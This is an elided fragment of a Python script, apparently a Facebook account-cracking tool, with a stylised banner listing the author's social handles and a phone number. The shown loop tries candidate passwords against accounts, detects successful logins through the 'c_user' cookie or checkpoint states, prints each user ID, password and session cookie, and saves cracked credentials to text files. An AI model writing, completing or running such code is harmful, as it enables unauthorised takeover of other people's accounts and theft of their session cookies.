# Facebook: Fahim Axelyev
# Github: Fahim Axelyev
...
╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░░╚════╝░░░╚═╝░░░
\033[0;94m╠═══════════════════════════════════════════════════║
\033[0;93m╠══[Author:=======================> \33[1;38mFahim Axelyev\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> Faizul Iban Fahim      ║  \033[1;97m
╠══[Github:=======================> \33[1;38mBDCF-FAHIM      ║\33[1;34m
╠══[Whatsapp:=====================> 01537310788     ║\33[1;35m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ZERO07-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ZERO07-0K.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[ZERO07-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ZERO07-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
